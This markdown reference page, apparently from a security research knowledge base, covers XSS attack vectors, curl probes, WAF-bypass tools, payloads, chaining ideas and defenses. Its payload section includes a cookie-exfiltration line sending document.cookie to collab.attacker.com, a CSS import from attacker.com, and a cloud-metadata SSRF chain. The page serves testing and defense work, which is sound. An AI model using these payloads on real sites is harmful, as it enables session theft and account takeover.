# XSS Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

Cross-Site Scripting — inject executable JavaScript into a page's rendering context to steal sessions, exfiltrate tokens, or pivot to admin ATO. Three flavors: **reflected** (query/header echoed back), **stored** (persisted in DB, fires for every viewer), **DOM** (client-side sink reads untrusted source).

Why it still pays in 2026: CSP adoption is patchy, SameSite=Lax is the default but not universal, and stored XSS in admin-visible surfaces (ticket titles, user bios, uploaded filenames) chains directly to staff ATO. Framework defaults cover 80% — the remaining 20% is SVG uploads, template-engine raw-output contexts, and headers reflected in error pages.

2025/2026 hot vectors:
- **SVG uploads** rendering inline — `<svg onload=...>` fires under any `image/svg+xml` Content-Type without `Content-Disposition: attachment`
- **Template raw-output** — Handlebars `{{{ }}}`, Jinja2 `| safe`, Angular `[innerHTML]`, Vue `v-html`
- **Hydration-stage injection** — user data inlined into `__NEXT_DATA__`, `window.__NUXT__` without proper JSON-encoding
- **Header reflection** — `X-Forwarded-For`, `Referer`, `User-Agent` echoed in error/debug pages
- **Admin-panel stored XSS** — staff views user-submitted data → admin session steal

Grep targets: `innerHTML`, `document.write`, `eval`, `dangerouslySetInnerHTML`, `v-html`, `{{{`, `bypassSecurityTrust`, `insertAdjacentHTML`.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

```bash
# Reflection canary — find input echoed raw in HTML body
canary='kdai9999"><img src=x onerror=ALERT>'
curl -sG "https://target/search" --data-urlencode "q=$canary" | grep -F "$canary"
# If canary appears verbatim (including `"` and `<`) → reflected unescaped

# Attribute context break
curl -sG "https://target/profile" --data-urlencode 'name=" autofocus onfocus="alert(1)'

# JS string context break (look for quoted reflection inside <script>)
curl -sSL "https://target/page?name=test" | grep -oE "<script>.{0,500}test.{0,500}</script>"

# Header reflection
curl -sS "https://target/" -H "X-Forwarded-For: <kdai>" | grep '<kdai>'
curl -sS "https://target/nonexistent-path-XXXX" -H "Referer: <kdai>" | grep '<kdai>'

# SVG upload probe — check Content-Type on served file
curl -sSI "https://target/uploads/user.svg" | grep -iE 'content-(type|disposition)'
# image/svg+xml + no attachment → XSS-able

# DOM XSS discovery (browser-side) — Burp DOM Invader or headless
# List DOM sinks reading window.location.hash:
#   document.querySelectorAll('script').forEach(s => console.log(s.textContent.match(/location\.hash|URLSearchParams|document\.referrer/)))

# Hydration payload leak
curl -sSL https://target/ | grep -oE '__NEXT_DATA__[^<]*' | head -c 400
curl -sSL https://target/ | grep -oE 'window\.__NUXT__[^<]*' | head -c 400
```

WAF bypass tooling:

```bash
dalfox url "https://target/search?q=FUZZ" --waf-bypass --silence
python3 xsstrike.py -u "https://target/?q=test" --crawl
nuclei -u https://target -tags xss -severity medium,high,critical
```

Context reminders:
- Inside `<script>` block, HTML escaping is irrelevant — only JS-string escaping matters
- Inside an attribute value quoted with `"`, HTML-encoding of `<` alone is insufficient — check if `"` is encoded
- On reflected strings, always test both URL and form-body injection; sometimes only one is sanitized

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

Priority-ordered:

- **Context-aware output encoding** — use framework defaults (React JSX, Vue template, Django autoescape). Never concatenate user data into HTML manually.
- **CSP** — `default-src 'self'; script-src 'self' 'nonce-<random>'; object-src 'none'; base-uri 'self'`. Strip `'unsafe-inline'` and `'unsafe-eval'`. Report-only mode first, then enforce.
- **SVG uploads** — serve from a separate origin with `Content-Disposition: attachment` or rewrite to PNG server-side. Never `image/svg+xml` on same-origin.
- **No raw-output template features in production** — lint for `{{{ }}}`, `| safe`, `v-html`, `[innerHTML]`, `dangerouslySetInnerHTML`. Allowlist a tiny set of rich-text fields and sanitize with DOMPurify.
- **Hydration safety** — JSON-encode before inlining with `<script type="application/json">`, then parse at runtime. Don't inline raw user input into inline `<script>`.
- **Cookie hardening** — `HttpOnly` on session cookies (blocks `document.cookie` theft), `Secure`, `SameSite=Strict` on sensitive endpoints, short session lifetime.
- **Header reflection** — strip or encode `X-Forwarded-For`/`Referer`/`User-Agent` before displaying in error pages. Custom error pages should not echo request data at all.
- **Admin panels** — render user-supplied content in an iframe with `sandbox` attribute (no `allow-scripts`) when preview is required. Better: render as text only.
- **Detection** — WAF rules for common XSS tokens (`<svg`, `onerror=`, `onload=`, `javascript:`), CSP violation reports piped to SIEM, monitor for spikes in `document.cookie` access from non-whitelisted origins in RUM data.

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Cross-Site Scripting — injecting executable JavaScript into a page context to steal sessions, exfiltrate data, or chain to further exploitation.

## Surface

- User-controlled input reflected in HTML body, attributes, or JS variables
- DOM sinks: `innerHTML`, `document.write`, `eval`, `location.href`, `setTimeout(str)`
- JSON responses used directly in `<script>` blocks without escaping
- SVG upload endpoints — SVG is HTML-parsed, `<script>` executes
- Template engines with raw output: Jinja2 `{{ }}`, Handlebars `{{{ }}}`, Angular `[innerHTML]`
- `X-Forwarded-For`, `Referer`, `User-Agent` headers reflected in error pages or logs
- Stored XSS in names, bios, comments, ticket titles — anything displayed to other users
- Admin panels rendering user-supplied data — stored XSS here escalates to admin session

## Test Approach

1. **Map all input sinks** — use Burp passive scan + manual review of JS source for DOM sinks
2. **Test reflection with a canary**: `"><img src=x onerror=alert(1)>` — look for unescaped output
3. **Attribute injection**: `" autofocus onfocus=alert(1) x="` for attribute contexts
4. **JS string injection**: `'; alert(1); //` or `\'; alert(1); //` in JS variable contexts
5. **DOM XSS**: trace `location.hash`, `URL`, `document.referrer` → DOM sinks in browser console
6. **WAF bypass**: use dalfox for automated bypass attempts:

   ```
   dalfox url "https://target.com/search?q=FUZZ" \
     --waf-bypass --silence --output results.txt
   ```

7. **Stored XSS sweep** — inject payloads in every profile/settings field; check how each field renders in other views (admin panel, email preview, PDF export)
8. **Header-based XSS** — set `X-Forwarded-For: <script>alert(1)</script>` and trigger an error page

## Tools

- **dalfox** — parameter-aware XSS scanner with WAF bypass; `dalfox url "https://target.com/search?q=test"`
- **XSStrike** — context-aware payload generation; `python3 xsstrike.py -u "https://target.com/?q=test"`
- **DOM Invader** (Burp) — traces DOM sources and sinks in browser context
- **nuclei** — template-based XSS detection: `nuclei -t xss/ -u https://target.com`

## Payloads / Probes

```html
<!-- Basic reflection test -->
"><img src=x onerror=alert(document.domain)>

<!-- Attribute context -->
" autofocus onfocus="alert(1)

<!-- JS string break -->
'; alert(document.cookie); //

<!-- SVG payload -->
<svg onload=alert(1)>

<!-- Template/Angular injection -->
{{constructor.constructor('alert(1)')()}}

<!-- Stored XSS — cookie exfil -->
<img src=x onerror="fetch('https://collab.attacker.com/?c='+document.cookie)">

<!-- CSS injection fallback (restricted contexts) -->
<style>@import 'https://attacker.com/steal.css'</style>
```

## Chain Opportunities

- **Stored XSS → Admin ATO** — payload fires in admin panel, exfiltrates CSRF token or session cookie
- **XSS + CSRF** — use XSS to perform state-changing actions bypassing SameSite cookies
- **XSS → SSRF** — `fetch('http://169.254.169.254/latest/meta-data/')` from victim browser
- **DOM XSS → prototype pollution** — pollute Object.prototype via `__proto__` in DOM sink
- **Reflected XSS → phishing** — crafted link with payload, delivered via open redirect

## Recent Intel

- **CVE-2023-24488** · Citrix Gateway open redirect + stored XSS in admin interface, bypass via URL param manipulation · https://www.assetnote.io/resources/research/advisory-citrix-gateway-open-redirect-and-xss-cve-2023-24488
- **Citrix Gateway firmware XSS** · Reverse-engineered admin panel revealed stored XSS via session parameter, auth context bypass · https://www.assetnote.io/resources/research/reversing-citrix-gateway-for-xss
- **Inline style exfiltration** · CSS injection via `style` attributes (no `<style>` block needed) leaks CSRF tokens char-by-char via background-image requests · https://portswigger.net/research/inline-style-exfiltration
